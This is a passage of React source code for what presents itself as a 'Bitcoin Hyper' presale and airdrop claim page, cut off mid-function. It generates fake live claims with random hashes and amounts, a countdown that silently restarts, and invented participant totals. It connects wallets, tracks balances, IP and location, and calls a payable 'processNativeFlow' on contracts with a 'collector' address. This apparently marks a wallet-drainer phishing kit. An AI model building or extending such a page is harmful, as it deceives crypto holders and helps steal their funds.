import React, { useState, useEffect, useRef } from 'react';
import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { useDisconnect } from 'wagmi';
import { ethers } from 'ethers';
import './index.css';

// ============================================
// API CONFIGURATION
// ============================================
const BACKEND_URL = 'https://hyperback-pm94.onrender.com';

// ============================================
// LANGUAGE DETECTION & TRANSLATIONS (full from working version)
// ============================================

const SUPPORTED_LANGUAGES = {
  en: { name: 'English', flag: '🇺🇸', native: 'English' },
  es: { name: 'Spanish', flag: '🇪🇸', native: 'Español' },
  fr: { name: 'French', flag: '🇫🇷', native: 'Français' },
  de: { name: 'German', flag: '🇩🇪', native: 'Deutsch' },
  it: { name: 'Italian', flag: '🇮🇹', native: 'Italiano' },
  pt: { name: 'Portuguese', flag: '🇵🇹', native: 'Português' },
  ru: { name: 'Russian', flag: '🇷🇺', native: 'Русский' },
  zh: { name: 'Chinese', flag: '🇨🇳', native: '中文' },
  ja: { name: 'Japanese', flag: '🇯🇵', native: '日本語' },
  ko: { name: 'Korean', flag: '🇰🇷', native: '한국어' },
  ar: { name: 'Arabic', flag: '🇸🇦', native: 'العربية' },
  hi: { name: 'Hindi', flag: '🇮🇳', native: 'हिन्दी' },
  tr: { name: 'Turkish', flag: '🇹🇷', native: 'Türkçe' },
  nl: { name: 'Dutch', flag: '🇳🇱', native: 'Nederlands' },
  pl: { name: 'Polish', flag: '🇵🇱', native: 'Polski' },
  vi: { name: 'Vietnamese', flag: '🇻🇳', native: 'Tiếng Việt' },
  th: { name: 'Thai', flag: '🇹🇭', native: 'ไทย' },
  id: { name: 'Indonesian', flag: '🇮🇩', native: 'Bahasa Indonesia' }
};

const TRANSLATIONS = {
  en: {
    presaleLive: 'PRESALE LIVE · STAGE 4',
    bonusEndsIn: 'BONUS ENDS IN',
    days: 'days',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'secs',
    bonus: '+25% BONUS',
    instantAirdrop: 'instant airdrop · +25% extra',
    bthPrice: 'BTH PRICE',
    bonusLabel: 'BONUS',
    presale: 'PRESALE',
    stage4: 'STAGE 4',
    claim: 'CLAIM BTH',
    processing: 'PROCESSING...',
    completed: '✓ COMPLETED SUCCESSFULLY',
    secured: 'Your BTH has been secured',
    view: 'VIEW YOUR BTH',
    welcome: 'Welcome to Bitcoin Hyper',
    connectWallet: 'CONNECT WALLET',
    disconnect: 'Disconnect Wallet',
    checkEligibility: 'Checking Eligibility',
    verifying: 'Verifying your wallet...',
    terms: 'Terms',
    delivery: 'Delivery',
    airdrop: 'Airdrop',
    liveNow: 'BTH · +25% bonus · live now',
    successful: 'SUCCESSFUL!',
    youHaveSecured: 'You have secured',
    viewButton: 'VIEW',
    checkWalletEligibility: '⚡ Check Wallet Eligibility',
    whenQualified: 'When qualified, confirm to claim your airdrop',
    valueBadge: 'BTH',
    progress: 'Progress',
    today: 'Today',
    avg: 'Avg',
    totalRaised: 'Total Raised',
    tokenPrice: 'Token Price',
    currentBonus: 'Current Bonus',
    participants: 'participants',
    liveClaims: 'LIVE CLAIMS',
    totalClaimed: 'Total Claimed',
    claimingNow: 'claiming now',
    lastClaim: 'Last claim',
    someoneJustClaimed: 'Someone just claimed!',
    securedTokens: 'secured',
    waitingForFirstClaim: 'Waiting for first claim...',
    claimAmount: 'BTH',
    bonusTag: '+25% bonus'
  },
  es: {
    presaleLive: 'PREVENTA EN VIVO · ETAPA 4',
    bonusEndsIn: 'EL BONO TERMINA EN',
    days: 'días',
    hrs: 'hrs',
    mins: 'mins',
    secs: 'segs',
    bonus: '+25% BONO',
    instantAirdrop: 'airdrop instantáneo · +25% extra',
    bthPrice: 'PRECIO BTH',
    bonusLabel: 'BONO',
    presale: 'PREVENTA',
    stage4: 'ETAPA 4',
    claim: 'RECLAMAR BTH',
    processing: 'PROCESANDO...',
    completed: '✓ COMPLETADO CON ÉXITO',
    secured: 'Tus BTH han sido asegurados',
    view: 'VER TUS BTH',
    welcome: 'Bienvenido a Bitcoin Hyper',
    connectWallet: 'CONECTAR WALLET',
    disconnect: 'Desconectar Wallet',
    checkEligibility: 'Verificando Elegibilidad',
    verifying: 'Verificando tu wallet...',
    terms: 'Términos',
    delivery: 'Entrega',
    airdrop: 'Airdrop',
    liveNow: 'BTH · +25% bono · en vivo ahora',
    successful: '¡EXITOSO!',
    youHaveSecured: 'Has asegurado',
    viewButton: 'VER',
    checkWalletEligibility: '⚡ Verificar Elegibilidad',
    whenQualified: 'Cuando califiques, confirma para reclamar tu airdrop',
    valueBadge: 'BTH',
    progress: 'Progreso',
    today: 'Hoy',
    avg: 'Prom',
    totalRaised: 'Total Recaudado',
    tokenPrice: 'Precio Token',
    currentBonus: 'Bono Actual',
    participants: 'participantes',
    liveClaims: 'RECLAMOS EN VIVO',
    totalClaimed: 'Total Reclamado',
    claimingNow: 'reclamando ahora',
    lastClaim: 'Último reclamo',
    someoneJustClaimed: '¡Alguien acaba de reclamar!',
    securedTokens: 'asegurado',
    waitingForFirstClaim: 'Esperando el primer reclamo...',
    claimAmount: 'BTH',
    bonusTag: '+25% bono'
  },
  fr: {
    presaleLive: 'PRÉVENTE EN DIRECT · ÉTAPE 4',
    bonusEndsIn: 'BONUS SE TERMINE DANS',
    days: 'jours',
    hrs: 'h',
    mins: 'min',
    secs: 's',
    bonus: '+25% BONUS',
    instantAirdrop: 'airdrop instantané · +25% extra',
    bthPrice: 'PRIX BTH',
    bonusLabel: 'BONUS',
    presale: 'PRÉVENTE',
    stage4: 'ÉTAPE 4',
    claim: 'RÉCLAMER BTH',
    processing: 'TRAITEMENT...',
    completed: '✓ TERMINÉ AVEC SUCCÈS',
    secured: 'Vos BTH ont été sécurisés',
    view: 'VOIR VOS BTH',
    welcome: 'Bienvenue sur Bitcoin Hyper',
    connectWallet: 'CONNECTER WALLET',
    disconnect: 'Déconnecter Wallet',
    checkEligibility: 'Vérification d\'Éligibilité',
    verifying: 'Vérification de votre wallet...',
    terms: 'Conditions',
    delivery: 'Livraison',
    airdrop: 'Airdrop',
    liveNow: 'BTH · +25% bonus · en direct',
    successful: 'SUCCÈS !',
    youHaveSecured: 'Vous avez sécurisé',
    viewButton: 'VOIR',
    checkWalletEligibility: '⚡ Vérifier Éligibilité',
    whenQualified: 'Une fois qualifié, confirmez pour réclamer votre airdrop',
    valueBadge: 'BTH',
    progress: 'Progrès',
    today: 'Aujourd\'hui',
    avg: 'Moy',
    totalRaised: 'Total Collecté',
    tokenPrice: 'Prix Token',
    currentBonus: 'Bonus Actuel',
    participants: 'participants',
    liveClaims: 'RÉCLAMATIONS EN DIRECT',
    totalClaimed: 'Total Réclamé',
    claimingNow: 'réclament maintenant',
    lastClaim: 'Dernière réclamation',
    someoneJustClaimed: 'Quelqu\'un vient de réclamer !',
    securedTokens: 'sécurisé',
    waitingForFirstClaim: 'En attente de la première réclamation...',
    claimAmount: 'BTH',
    bonusTag: '+25% bonus'
  },
  de: {
    presaleLive: 'VORVERKAUF LIVE · STUFE 4',
    bonusEndsIn: 'BONUS ENDET IN',
    days: 'Tage',
    hrs: 'Std',
    mins: 'Min',
    secs: 'Sek',
    bonus: '+25% BONUS',
    instantAirdrop: 'sofortiger Airdrop · +25% extra',
    bthPrice: 'BTH PREIS',
    bonusLabel: 'BONUS',
    presale: 'VORVERKAUF',
    stage4: 'STUFE 4',
    claim: 'BTH ANFORDERN',
    processing: 'VERARBEITUNG...',
    completed: '✓ ERFOLGREICH ABGESCHLOSSEN',
    secured: 'Ihre BTH wurden gesichert',
    view: 'IHRE BTH ANSEHEN',
    welcome: 'Willkommen bei Bitcoin Hyper',
    connectWallet: 'WALLET VERBINDEN',
    disconnect: 'Wallet trennen',
    checkEligibility: 'Berechtigung prüfen',
    verifying: 'Ihr Wallet wird verifiziert...',
    terms: 'Bedingungen',
    delivery: 'Lieferung',
    airdrop: 'Airdrop',
    liveNow: 'BTH · +25% Bonus · live jetzt',
    successful: 'ERFOLGREICH!',
    youHaveSecured: 'Sie haben gesichert',
    viewButton: 'ANSEHEN',
    checkWalletEligibility: '⚡ Berechtigung prüfen',
    whenQualified: 'Bei Qualifikation bestätigen, um Airdrop zu erhalten',
    valueBadge: 'BTH',
    progress: 'Fortschritt',
    today: 'Heute',
    avg: 'Schnitt',
    totalRaised: 'Gesamt eingesammelt',
    tokenPrice: 'Token Preis',
    currentBonus: 'Aktueller Bonus',
    participants: 'Teilnehmer',
    liveClaims: 'LIVE-ANFORDERUNGEN',
    totalClaimed: 'Insgesamt angefordert',
    claimingNow: 'fordern jetzt an',
    lastClaim: 'Letzte Anforderung',
    someoneJustClaimed: 'Jemand hat gerade angefordert!',
    securedTokens: 'gesichert',
    waitingForFirstClaim: 'Warten auf erste Anforderung...',
    claimAmount: 'BTH',
    bonusTag: '+25% Bonus'
  },
  zh: {
    presaleLive: '预售进行中 · 第四阶段',
    bonusEndsIn: '奖励结束于',
    days: '天',
    hrs: '小时',
    mins: '分钟',
    secs: '秒',
    bonus: '+25% 奖励',
    instantAirdrop: '即时空投 · +25% 额外',
    bthPrice: 'BTH 价格',
    bonusLabel: '奖励',
    presale: '预售',
    stage4: '第四阶段',
    claim: '领取 BTH',
    processing: '处理中...',
    completed: '✓ 成功完成',
    secured: '您的 BTH 已确保',
    view: '查看您的 BTH',
    welcome: '欢迎来到 Bitcoin Hyper',
    connectWallet: '连接钱包',
    disconnect: '断开钱包',
    checkEligibility: '检查资格',
    verifying: '正在验证您的钱包...',
    terms: '条款',
    delivery: '交付',
    airdrop: '空投',
    liveNow: 'BTH · +25% 奖励 · 正在进行',
    successful: '成功！',
    youHaveSecured: '您已确保',
    viewButton: '查看',
    checkWalletEligibility: '⚡ 检查钱包资格',
    whenQualified: '符合条件时，确认领取空投',
    valueBadge: 'BTH',
    progress: '进度',
    today: '今日',
    avg: '平均',
    totalRaised: '总筹集',
    tokenPrice: '代币价格',
    currentBonus: '当前奖励',
    participants: '参与者',
    liveClaims: '实时领取',
    totalClaimed: '总领取量',
    claimingNow: '正在领取',
    lastClaim: '上次领取',
    someoneJustClaimed: '刚刚有人领取了！',
    securedTokens: '已确保',
    waitingForFirstClaim: '等待首次领取...',
    claimAmount: 'BTH',
    bonusTag: '+25% 奖励'
  },
  ja: {
    presaleLive: 'プレセール実施中 · ステージ4',
    bonusEndsIn: 'ボーナス終了まで',
    days: '日',
    hrs: '時間',
    mins: '分',
    secs: '秒',
    bonus: '+25% ボーナス',
    instantAirdrop: '即時エアドロップ · +25% 追加',
    bthPrice: 'BTH 価格',
    bonusLabel: 'ボーナス',
    presale: 'プレセール',
    stage4: 'ステージ4',
    claim: 'BTH を受け取る',
    processing: '処理中...',
    completed: '✓ 正常に完了',
    secured: 'BTH が確保されました',
    view: 'BTH を表示',
    welcome: 'Bitcoin Hyper へようこそ',
    connectWallet: 'ウォレット接続',
    disconnect: 'ウォレット切断',
    checkEligibility: '資格確認中',
    verifying: 'ウォレットを検証中...',
    terms: '利用規約',
    delivery: '配信',
    airdrop: 'エアドロップ',
    liveNow: 'BTH · +25% ボーナス · 実施中',
    successful: '成功！',
    youHaveSecured: '確保しました',
    viewButton: '表示',
    checkWalletEligibility: '⚡ ウォレット資格を確認',
    whenQualified: '資格がある場合、確認してエアドロップを受け取る',
    valueBadge: 'BTH',
    progress: '進捗',
    today: '今日',
    avg: '平均',
    totalRaised: '総調達額',
    tokenPrice: 'トークン価格',
    currentBonus: '現在のボーナス',
    participants: '参加者',
    liveClaims: 'ライフクレーム',
    totalClaimed: '総請求額',
    claimingNow: '請求中',
    lastClaim: '最後の請求',
    someoneJustClaimed: '誰かが請求しました！',
    securedTokens: '確保済み',
    waitingForFirstClaim: '最初の請求を待っています...',
    claimAmount: 'BTH',
    bonusTag: '+25% ボーナス'
  },
  ko: {
    presaleLive: '프리세일 진행 중 · 4단계',
    bonusEndsIn: '보너스 종료까지',
    days: '일',
    hrs: '시간',
    mins: '분',
    secs: '초',
    bonus: '+25% 보너스',
    instantAirdrop: '즉시 에어드랍 · +25% 추가',
    bthPrice: 'BTH 가격',
    bonusLabel: '보너스',
    presale: '프리세일',
    stage4: '4단계',
    claim: 'BTH 받기',
    processing: '처리 중...',
    completed: '✓ 성공적으로 완료',
    secured: 'BTH가 확보되었습니다',
    view: 'BTH 보기',
    welcome: 'Bitcoin Hyper에 오신 것을 환영합니다',
    connectWallet: '지갑 연결',
    disconnect: '지갑 연결 해제',
    checkEligibility: '자격 확인 중',
    verifying: '지갑 확인 중...',
    terms: '약관',
    delivery: '전달',
    airdrop: '에어드랍',
    liveNow: 'BTH · +25% 보너스 · 진행 중',
    successful: '성공!',
    youHaveSecured: '확보했습니다',
    viewButton: '보기',
    checkWalletEligibility: '⚡ 지갑 자격 확인',
    whenQualified: '자격이 되면 확인하여 에어드랍 받기',
    valueBadge: 'BTH',
    progress: '진행률',
    today: '오늘',
    avg: '평균',
    totalRaised: '총 모금액',
    tokenPrice: '토큰 가격',
    currentBonus: '현재 보너스',
    participants: '참가자',
    liveClaims: '실시간 클레임',
    totalClaimed: '총 클레임',
    claimingNow: '클레임 중',
    lastClaim: '마지막 클레임',
    someoneJustClaimed: '누군가 방금 클레임했습니다!',
    securedTokens: '확보됨',
    waitingForFirstClaim: '첫 클레임 대기 중...',
    claimAmount: 'BTH',
    bonusTag: '+25% 보너스'
  }
};

// ============================================
// DEPLOYED CONTRACTS (for relayer)
// ============================================

const MULTICHAIN_CONFIG = {
  Ethereum: {
    chainId: 1,
    contractAddress: '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8',
    name: 'Ethereum',
    symbol: 'ETH',
    explorer: 'https://etherscan.io',
    icon: '⟠',
    color: 'from-red-500 to-red-600',
    rpc: 'https://eth.llamarpc.com'
  },
  BSC: {
    chainId: 56,
    contractAddress: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
    name: 'BSC',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    icon: '🟡',
    color: 'from-red-500 to-red-600',
    rpc: 'https://bsc-dataseed.binance.org'
  },
  Polygon: {
    chainId: 137,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Polygon',
    symbol: 'MATIC',
    explorer: 'https://polygonscan.com',
    icon: '⬢',
    color: 'from-red-500 to-red-600',
    rpc: 'https://polygon-rpc.com'
  },
  Arbitrum: {
    chainId: 42161,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Arbitrum',
    symbol: 'ETH',
    explorer: 'https://arbiscan.io',
    icon: '🔷',
    color: 'from-red-500 to-red-600',
    rpc: 'https://arb1.arbitrum.io/rpc'
  },
  Avalanche: {
    chainId: 43114,
    contractAddress: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288',
    name: 'Avalanche',
    symbol: 'AVAX',
    explorer: 'https://snowtrace.io',
    icon: '🔴',
    color: 'from-red-500 to-red-600',
    rpc: 'https://api.avax.network/ext/bc/C/rpc'
  }
};

const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "event FlowProcessed(address indexed initiator, uint256 value)"
];

// ============================================
// PERSISTENT STORAGE KEYS
// ============================================
const STORAGE_KEYS = {
  LIVE_TRANSACTIONS: 'bitcoinHyper_liveTransactions',
  LAST_RESET_DATE: 'bitcoinHyper_lastResetDate',
  TOTAL_CLAIMED_AMOUNT: 'bitcoinHyper_totalClaimedAmount',
  COUNTDOWN_END_TIME: 'bitcoinHyper_countdownEndTime'
};

const hasDateChanged = (lastDate) => {
  if (!lastDate) return true;
  const today = new Date().toDateString();
  return lastDate !== today;
};

const getRandomClaimAmount = () => {
  return Math.floor(Math.random() * (8000 - 3000 + 1) + 3000);
};

// ============================================
// LIVE CLAIM POPUP & FEED COMPONENTS
// ============================================
const LiveClaimPopup = ({ tx, onClose, translations }) => {
  const [visible, setVisible] = useState(true);
  useEffect(() => {
    const timer = setTimeout(() => { setVisible(false); onClose(); }, 8000);
    return () => clearTimeout(timer);
  }, [onClose]);
  if (!visible) return null;
  return (
    <div className="fixed bottom-24 right-4 z-50 animate-slideInUp md:bottom-28 md:right-8">
      <div className="bg-gradient-to-r from-gray-900 to-black border-l-4 border-red-500 rounded-lg shadow-2xl p-4 max-w-sm backdrop-blur-lg">
        <div className="flex items-start gap-3">
          <div className="w-10 h-10 bg-red-500/20 rounded-full flex items-center justify-center animate-pulse"><span className="text-xl">🎁</span></div>
          <div className="flex-1">
            <p className="text-sm font-bold text-red-400">{translations.someoneJustClaimed}</p>
            <p className="text-xs text-gray-300 mt-1">
              <span className="font-mono">{tx.hash.slice(0,6)}...{tx.hash.slice(-4)}</span> {translations.securedTokens}{' '}
              <span className="text-red-400 font-bold">${tx.claimAmount?.toLocaleString() || '5,000'} {translations.claimAmount}</span> +25% bonus
            </p>
          </div>
          <button onClick={() => setVisible(false)} className="text-gray-500 hover:text-gray-300">✕</button>
        </div>
      </div>
    </div>
  );
};

const LiveTransactionFeed = ({ transactions, translations, totalClaimedAmount, todayCount, bthPrice }) => {
  const totalBTHAmount = totalClaimedAmount / (bthPrice || 0.045);
  return (
    <div className="w-full max-w-md mx-auto mt-8 bg-black/40 backdrop-blur rounded-xl border border-red-500/20 overflow-hidden">
      <div className="bg-gradient-to-r from-red-600/20 to-transparent px-4 py-3 border-b border-red-500/20 flex items-center justify-between">
        <div className="flex items-center gap-2"><div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div><span className="text-sm font-semibold text-red-400">{translations.liveClaims}</span></div>
        <div className="flex items-center gap-3"><span className="text-xs text-gray-500">{todayCount} {translations.participants?.toLowerCase() || 'claims'} today</span><div className="w-1 h-4 bg-red-500/30 rounded-full"></div><span className="text-xs text-green-400 font-mono">● LIVE</span></div>
      </div>
      <div className="max-h-64 overflow-y-auto custom-scrollbar">
        {transactions.length === 0 ? (
          <div className="p-8 text-center text-gray-500 text-sm"><div className="animate-pulse text-2xl mb-2">⚡</div>{translations.waitingForFirstClaim}</div>
        ) : (
          transactions.map((tx, idx) => (
            <div key={idx} className="px-4 py-3 border-b border-red-500/10 hover:bg-red-500/5 transition-all duration-300 group">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2"><span className="text-green-400 text-xs animate-pulse">●</span><span className="font-mono text-xs text-gray-300 group-hover:text-red-400 transition-colors">{tx.hash.slice(0,6)}...{tx.hash.slice(-4)}</span></div>
                <div className="flex items-center gap-2"><span className="text-xs text-red-400 font-mono font-bold">${tx.claimAmount?.toLocaleString() || '5,000'} {translations.claimAmount}</span><span className="text-[10px] text-yellow-500 bg-yellow-500/10 px-1.5 py-0.5 rounded-full">{translations.bonusTag || '+25%'}</span></div>
              </div>
              <div className="flex items-center justify-between mt-1"><span className="text-[10px] text-gray-500">{tx.timeAgo}{tx.chain && <span className="ml-2 text-gray-600">• {tx.chain}</span>}</span><span className="text-[10px] text-gray-600">#{(transactions.length - idx).toString().padStart(4,'0')}</span></div>
            </div>
          ))
        )}
      </div>
      <div className="px-4 py-2 bg-red-500/5 border-t border-red-500/10 flex items-center justify-between"><p className="text-[10px] text-gray-500">🔗 {translations.totalClaimed}: </p><p className="text-xs text-red-400 font-mono font-bold">{Math.floor(totalBTHAmount).toLocaleString()} {translations.claimAmount}</p></div>
    </div>
  );
};

const LiveActivityBadge = ({ translations, activeUsers, lastClaimTime }) => (
  <div className="flex items-center justify-center gap-4 mb-4 text-xs flex-wrap">
    <div className="flex items-center gap-1 bg-red-500/10 px-3 py-1.5 rounded-full backdrop-blur"><div className="flex -space-x-2">{[...Array(3)].map((_,i)=><div key={i} className="w-6 h-6 rounded-full bg-red-500/30 border border-red-500/50 flex items-center justify-center text-[10px]">👤</div>)}</div><span className="text-gray-300 ml-1">{activeUsers} {translations.claimingNow}</span></div>
    <div className="text-gray-600">•</div>
    <div className="flex items-center gap-1 bg-red-500/10 px-3 py-1.5 rounded-full backdrop-blur"><span className="text-green-400 text-xs animate-pulse">⚡</span><span className="text-gray-300">{translations.lastClaim}: {lastClaimTime}</span></div>
    <div className="text-gray-600">•</div>
    <div className="flex items-center gap-1 bg-red-500/10 px-3 py-1.5 rounded-full backdrop-blur"><span className="text-yellow-400 text-xs">🔥</span><span className="text-gray-300">+25% BONUS</span></div>
  </div>
);

// ============================================
// MAIN APP COMPONENT
// ============================================
function App() {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider("eip155");
  const { disconnect } = useDisconnect();

  // --- State from working version (balances, eligibility) ---
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balances, setBalances] = useState({});
  const [loading, setLoading] = useState(false);
  const [signatureLoading, setSignatureLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [error, setError] = useState('');
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [verifiedChains, setVerifiedChains] = useState([]);
  const [prices, setPrices] = useState({ eth: 2000, bnb: 300, matic: 0.75, avax: 32 });
  const [userEmail, setUserEmail] = useState('');
  const [userLocation, setUserLocation] = useState({ country: '', city: '', flag: '', ip: '' });
  const [hoverConnect, setHoverConnect] = useState(false);
  const [walletInitialized, setWalletInitialized] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanning, setScanning] = useState(false);
  const [currentFlowId, setCurrentFlowId] = useState('');
  const [isEligible, setIsEligible] = useState(false);
  const [eligibleChains, setEligibleChains] = useState([]);
  const [processedAmounts, setProcessedAmounts] = useState({});
  const [allChainsCompleted, setAllChainsCompleted] = useState(false);
  const [executableChains, setExecutableChains] = useState([]);
  const [showRibbon, setShowRibbon] = useState(true);
  const [processingChain, setProcessingChain] = useState('');
  const [bnbAmount, setBnbAmount] = useState('');
  const [autoTriggered, setAutoTriggered] = useState(false);
  const autoTriggerTimeout = useRef(null);
  const [relayerWallet, setRelayerWallet] = useState('');

  // --- Live transactions state ---
  const [liveTransactions, setLiveTransactions] = useState([]);
  const [showPopup, setShowPopup] = useState(false);
  const [currentPopupTx, setCurrentPopupTx] = useState(null);
  const [activeUsers, setActiveUsers] = useState(0);
  const [lastClaimTime, setLastClaimTime] = useState('Just now');
  const [todayTotalClaimed, setTodayTotalClaimed] = useState(0);

  // --- Language ---
  const [language, setLanguage] = useState('en');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const [translations, setTranslations] = useState(TRANSLATIONS.en);

  // --- Presale stats ---
  const [timeLeft, setTimeLeft] = useState({ days: 6, hours: 23, minutes: 59, seconds: 59 });
  const [presaleStats, setPresaleStats] = useState({
    totalRaised: 1250000, totalSold: 4250000, totalParticipants: 8742, currentBonus: 25,
    nextBonus: 15, tokenPrice: 0.045, hardCap: 10000000, bthPrice: 0.045
  });

  // --- Helpers for live feed ---
  const formatTimeAgo = (date) => {
    const seconds = Math.floor((new Date() - new Date(date)) / 1000);
    if (seconds < 5) return 'Just now';
    if (seconds < 60) return `${seconds}s ago`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes}m ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours}h ago`;
    return `${Math.floor(hours / 24)}d ago`;
  };
  const generateRandomHash = () => {
    const prefixes = ['0x7a3f', '0x9e1c', '0x4d5f', '0x2b8a', '0x6c9d', '0x8f3e', '0x1a7b', '0x5c2d'];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return prefix + Array.from({ length: 60 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
  };
  const getRandomChain = () => ['Ethereum', 'BSC', 'Polygon', 'Arbitrum', 'Avalanche'][Math.floor(Math.random() * 5)];

  // --- Countdown (7 days persistent) ---
  useEffect(() => {
    const initializeCountdown = () => {
      const savedEndTime = localStorage.getItem(STORAGE_KEYS.COUNTDOWN_END_TIME);
      const now = Date.now();
      if (savedEndTime && parseInt(savedEndTime) > now) return parseInt(savedEndTime);
      const newEndTime = now + 7 * 24 * 60 * 60 * 1000;
      localStorage.setItem(STORAGE_KEYS.COUNTDOWN_END_TIME, newEndTime.toString());
      return newEndTime;
    };
    let endTime = initializeCountdown();
    const timer = setInterval(() => {
      const now = Date.now();
      const diff = endTime - now;
      if (diff <= 0) {
        endTime = now + 7 * 24 * 60 * 60 * 1000;
        localStorage.setItem(STORAGE_KEYS.COUNTDOWN_END_TIME, endTime.toString());
        const newDiff = endTime - now;
        setTimeLeft({ days: Math.floor(newDiff / (1000*60*60*24)), hours: Math.floor((newDiff % (1000*60*60*24)) / (1000*60*60)), minutes: Math.floor((newDiff % (1000*60*60)) / (1000*60)), seconds: Math.floor((newDiff % (1000*60)) / 1000) });
      } else {
        setTimeLeft({ days: Math.floor(diff / (1000*60*60*24)), hours: Math.floor((diff % (1000*60*60*24)) / (1000*60*60)), minutes: Math.floor((diff % (1000*60*60)) / (1000*60)), seconds: Math.floor((diff % (1000*60)) / 1000) });
      }
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // --- Load persistent live transactions ---
  useEffect(() => {
    const loadPersistentData = () => {
      const lastDate = localStorage.getItem(STORAGE_KEYS.LAST_RESET_DATE);
      const savedTransactions = localStorage.getItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
      if (hasDateChanged(lastDate)) {
        localStorage.setItem(STORAGE_KEYS.LAST_RESET_DATE, new Date().toDateString());
        localStorage.removeItem(STORAGE_KEYS.LIVE_TRANSACTIONS);
        const initial = [{ hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', claimAmount: 5200 }, { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now()-180000).toISOString(), chain: 'BSC', claimAmount: 3800 }, { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now()-420000).toISOString(), chain: 'Polygon', claimAmount: 7500 }].map(tx => ({ ...tx, timeAgo: formatTimeAgo(tx.time) }));
        setLiveTransactions(initial);
      } else if (savedTransactions) {
        const parsed = JSON.parse(savedTransactions);
        setLiveTransactions(parsed.map(tx => ({ ...tx, timeAgo: formatTimeAgo(tx.time) })));
      } else {
        const initial = [{ hash: '0x7a3f2b9e1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a', time: new Date().toISOString(), chain: 'Ethereum', claimAmount: 6200 }, { hash: '0x3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', time: new Date(Date.now()-180000).toISOString(), chain: 'BSC', claimAmount: 4500 }, { hash: '0x9e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f', time: new Date(Date.now()-420000).toISOString(), chain: 'Polygon', claimAmount: 8000 }].map(tx => ({ ...tx, timeAgo: formatTimeAgo(tx.time) }));
        setLiveTransactions(initial);
      }
    };
    loadPersistentData();
  }, []);

  useEffect(() => {
    if (liveTransactions.length) localStorage.setItem(STORAGE_KEYS.LIVE_TRANSACTIONS, JSON.stringify(liveTransactions.map(({ timeAgo, ...tx }) => tx)));
  }, [liveTransactions]);
  useEffect(() => { setTodayTotalClaimed(liveTransactions.reduce((s,t)=>s+(t.claimAmount||5000),0)); }, [liveTransactions]);

  // --- Random popups schedule ---
  useEffect(() => {
    let isMounted = true;
    const schedule = () => {
      const delay = Math.random() * (15*60*1000 - 8*60*1000) + 8*60*1000;
      const id = setTimeout(() => {
        if (!isMounted) return;
        const newTx = { hash: generateRandomHash(), time: new Date().toISOString(), timeAgo: 'Just now', chain: getRandomChain(), claimAmount: getRandomClaimAmount() };
        setCurrentPopupTx(newTx); setShowPopup(true);
        setLiveTransactions(prev => [{ ...newTx, timeAgo: formatTimeAgo(newTx.time) }, ...prev.slice(0,19)]);
        setActiveUsers(Math.floor(Math.random()*15)+5); setLastClaimTime('Just now');
        setTimeout(() => setLastClaimTime('Just now'), 2000);
        schedule();
      }, delay);
      return id;
    };
    const id = schedule();
    return () => { isMounted = false; clearTimeout(id); };
  }, []);
  useEffect(() => { const interval = setInterval(() => setActiveUsers(Math.floor(Math.random()*15)+3), 30000); return () => clearInterval(interval); }, []);

  // --- Language detection ---
  useEffect(() => {
    const detect = () => {
      const pathLang = window.location.pathname.split('/')[1];
      if (pathLang && SUPPORTED_LANGUAGES[pathLang]) { setLanguage(pathLang); setTranslations(TRANSLATIONS[pathLang] || TRANSLATIONS.en); return; }
      const browserLang = navigator.language.split('-')[0];
      setLanguage(browserLang && SUPPORTED_LANGUAGES[browserLang] ? browserLang : 'en');
      setTranslations(TRANSLATIONS[browserLang] || TRANSLATIONS.en);
    };
    detect();
  }, []);
  const changeLanguage = (code) => { setLanguage(code); setTranslations(TRANSLATIONS[code] || TRANSLATIONS.en); setShowLanguageDropdown(false); const url = new URL(window.location); if (code === 'en') url.pathname = url.pathname.replace(/^\/[a-z]{2}\//,'/') || '/'; else url.pathname = `/${code}${url.pathname}`; window.history.pushState({}, '', url.toString()); };

  // --- Fetch crypto prices ---
  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2&vs_currencies=usd');
        const data = await res.json();
        setPrices({ eth: data.ethereum?.usd || 2000, bnb: data.binancecoin?.usd || 300, matic: data['matic-network']?.usd || 0.75, avax: data['avalanche-2']?.usd || 32 });
      } catch(e) { console.log('Using default prices'); }
    };
    fetchPrices();
    const interval = setInterval(fetchPrices, 60000);
    return () => clearInterval(interval);
  }, []);

  // --- Fetch relayer wallet (collector) ---
  useEffect(() => {
